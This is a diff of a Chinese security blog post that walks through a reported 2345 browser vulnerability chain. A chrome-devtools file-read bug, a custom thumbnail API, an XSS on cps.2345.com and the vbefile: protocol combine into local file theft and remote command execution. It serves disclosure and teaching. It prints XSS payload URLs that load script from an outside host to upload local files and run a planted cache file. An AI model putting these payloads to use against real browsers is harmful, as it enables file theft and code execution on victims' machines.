@@ -17,27 +17,27 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL1chrome-d">
+  <meta name="description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL 1chrome-">
 <meta name="keywords" content="安全,XSS,浏览器安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[浏览器安全系列一] 2345浏览器本地文件读取及远程命令执行">
 <meta property="og:url" content="http://zhchbin.github.io/2016/07/23/2345-Browser-RCE/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL1chrome-d">
+<meta property="og:description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL 1chrome-">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif">
-<meta property="og:updated_time" content="2016-10-02T05:43:40.000Z">
+<meta property="og:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg">
+<meta property="og:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg">
+<meta property="og:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hxp65frrj30j20abju9.jpg">
+<meta property="og:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hxp84i17j30k6098ac5.jpg">
+<meta property="og:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif">
+<meta property="og:updated_time" content="2022-05-15T03:29:03.456Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[浏览器安全系列一] 2345浏览器本地文件读取及远程命令执行">
-<meta name="twitter:description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL1chrome-d">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg">
+<meta name="twitter:description" content="案例链接：http://wooyun.org/bugs/wooyun-2016-0204520 背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL 1chrome-">
+<meta name="twitter:image" content="http://zhchbin.github.io/images/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg">
 
 <link rel="canonical" href="http://zhchbin.github.io/2016/07/23/2345-Browser-RCE/">
 
@@ -124,6 +124,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
@@ -160,7 +170,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2016/07/23/2345-Browser-RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -187,7 +197,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2016-10-02 13:43:40" itemprop="dateModified" datetime="2016-10-02T13:43:40+08:00">2016-10-02</time>
+                <time title="Modified: 2022-05-15 11:29:03" itemprop="dateModified" datetime="2022-05-15T11:29:03+08:00">2022-05-15</time>
               </span>
 
           
@@ -202,23 +212,30 @@
 
       
         <p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0204520" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0204520</a></p>
-<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="0x00-chrome-devtools本地文件读取漏洞"><a href="#0x00-chrome-devtools本地文件读取漏洞" class="headerlink" title="0x00 chrome-devtools本地文件读取漏洞"></a>0x00 chrome-devtools本地文件读取漏洞</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0176314" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0176314</a> 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&amp;remoteFrontend=true</span><br></pre></td></tr></table></figure></p>
-<p>就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个<code>111.txt</code>并写入内容，运行服务器之后，在2345浏览器打开<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true</code>。本地测试截图：<br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg" alt=""></p>
-<h4 id="0x01-WebKit系浏览器伪协议调用"><a href="#0x01-WebKit系浏览器伪协议调用" class="headerlink" title="0x01 WebKit系浏览器伪协议调用"></a>0x01 WebKit系浏览器伪协议调用</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0175902" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0175902</a> 中，可以通过<code>location.href=&quot;vbefile:/../../../已知路径/1.js&quot;</code>来执行本地文件<code>1.js</code><br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg" alt=""></p>
+<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="0x00-chrome-devtools本地文件读取漏洞"><a href="#0x00-chrome-devtools本地文件读取漏洞" class="headerlink" title="0x00 chrome-devtools本地文件读取漏洞"></a>0x00 chrome-devtools本地文件读取漏洞</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0176314" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0176314</a> 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&amp;remoteFrontend=true</span><br></pre></td></tr></table></figure></p>
+<p>就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个<code>111.txt</code>并写入内容，运行服务器之后，在2345浏览器打开<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true</code>。本地测试截图：
+<img src="/images/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg" alt=""></p>
+<h4 id="0x01-WebKit系浏览器伪协议调用"><a href="#0x01-WebKit系浏览器伪协议调用" class="headerlink" title="0x01 WebKit系浏览器伪协议调用"></a>0x01 WebKit系浏览器伪协议调用</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0175902" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0175902</a> 中，可以通过<code>location.href=&quot;vbefile:/../../../已知路径/1.js&quot;</code>来执行本地文件<code>1.js</code>
+<img src="/images/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg" alt=""></p>
 <h3 id="一步一步构造PoC"><a href="#一步一步构造PoC" class="headerlink" title="一步一步构造PoC"></a>一步一步构造PoC</h3><h4 id="0x00-首先我们来思考如何实现读取本地文件"><a href="#0x00-首先我们来思考如何实现读取本地文件" class="headerlink" title="0x00 首先我们来思考如何实现读取本地文件"></a>0x00 首先我们来思考如何实现读取本地文件</h4><p>要让用户自己主动打开：<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://x.xx.com/file/&amp;remoteFrontend=true</code>貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not allowed to load local resource，或打开页面是空白等措施。</p>
 <h4 id="0x01-国产浏览器的毛病"><a href="#0x01-国产浏览器的毛病" class="headerlink" title="0x01 国产浏览器的毛病"></a>0x01 国产浏览器的毛病</h4><p>在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：<code>chrome.ntp2345.prepareThumbnail</code>，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.ntp2345.prepareThumbnail(&apos;chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true&apos;)</span><br></pre></td></tr></table></figure>
 <h4 id="0x02-XSS来帮忙"><a href="#0x02-XSS来帮忙" class="headerlink" title="0x02 XSS来帮忙"></a>0x02 XSS来帮忙</h4><p>发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下<code>site:2345.com inurl:url</code>就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的<a href="http://wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0179329</a> ，不受chrome限制的XSSAuditor一个反射型XSS。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:alert(document.domain);//</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg" alt=""></p>
+<p><img src="/images/005GzSIagw1f3hxp65frrj30j20abju9.jpg" alt="">
+<img src="/images/005GzSIagw1f3hxp84i17j30k6098ac5.jpg" alt=""></p>
 <h4 id="0x03-本地文件读取PoC"><a href="#0x03-本地文件读取PoC" class="headerlink" title="0x03 本地文件读取PoC"></a>0x03 本地文件读取PoC</h4><p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240" target="_blank" rel="noopener">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240</a></p>
-<p>用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
+<p>用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
 <p>过程总结：cps.2345.com域名下的XSS，加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。</p>
 <h4 id="0x04-我们来实现远程命令执行"><a href="#0x04-我们来实现远程命令执行" class="headerlink" title="0x04 我们来实现远程命令执行"></a>0x04 我们来实现远程命令执行</h4><p>原理：（1）上述的chrome-devtools本地文件读取漏洞不仅能读取文件，还能读取文件列表！（2）我们可以通过浏览器的cache机制，写入我们指定的内容到浏览器的cache目录中（3）可以利用WebKit系浏览器伪协议调用执行cache文件。</p>
 <p>2345浏览器的默认cache目录在：C:\Users\%USERNAME%\AppData\Local\2345Explorer\User Data\Default\Cache。要执行这个目录下的cache文件，我们要解决两个问题，首先是找出当前系统的用户名，第二是定位到我们的恶意cache文件。第一个问题，我们可以通过读取C:\Users这个目录下的文件列表，得到用户列表。然后针对每个用户，执行以下的操作来定位恶意cache文件：获取cache目录下的文件列表，保存在localStorage中，然后利用插入img的方式写入恶意cache文件，完成后再获取一次cache目录下的文件列表，找出第二次集合中新增加的文件，上传到服务器中，前端跳转到执行页面，指定iframe的src为<code>vbefile:/../../../../../../../../Users/xxx/AppData/Local/2345Explorer/User Data/Default/Cache/f_xxxx</code>，从而达到命令执行的效果。</p>
-<p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196" target="_blank" rel="noopener">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196</a><br>用户点击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
+<p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196" target="_blank" rel="noopener">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196</a>
+用户点击：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/xss.js%27;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
 <p>测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。</p>
-<p><img src="http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif" alt=""></p>
+<p><img src="/images/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif" alt=""></p>
 
     </div>
 
@@ -239,8 +256,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2016/06/25/loneliness/" rel="prev" title="感受孤独">
-      <i class="fa fa-chevron-left"></i> 感受孤独
+    <a href="/2016/04/09/Problems-Caused-by-URL-Redirection/" rel="prev" title="一个URL跳转引发的一系列“惨案”">
+      <i class="fa fa-chevron-left"></i> 一个URL跳转引发的一系列“惨案”
     </a></div>
       <div class="post-nav-item">
     <a href="/2016/09/01/Baidu-Browser-RCE/" rel="next" title="[浏览器安全系列二] 百度浏览器远程命令执行">
@@ -304,12 +321,13 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景知识"><span class="nav-number">1.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-chrome-devtools本地文件读取漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 chrome-devtools本地文件读取漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-WebKit系浏览器伪协议调用"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 WebKit系浏览器伪协议调用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一步一步构造PoC"><span class="nav-number">2.</span> <span class="nav-text">一步一步构造PoC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-首先我们来思考如何实现读取本地文件"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 首先我们来思考如何实现读取本地文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-国产浏览器的毛病"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 国产浏览器的毛病</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-XSS来帮忙"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 XSS来帮忙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-本地文件读取PoC"><span class="nav-number">2.4.</span> <span class="nav-text">0x03 本地文件读取PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-我们来实现远程命令执行"><span class="nav-number">2.5.</span> <span class="nav-text">0x04 我们来实现远程命令执行</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chaobin Zhang"
+      src="/images/avatar.jpeg">
   <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -318,7 +336,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -328,11 +346,20 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zhchbin" title="GitHub → https://github.com/zhchbin" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://hackerone.com/zhchbin" title="Hackerone → https://hackerone.com/zhchbin" rel="noopener" target="_blank"><i class="fa fa-fw"></i>Hackerone</a>
+      </span>
+  </div>
 
 
 
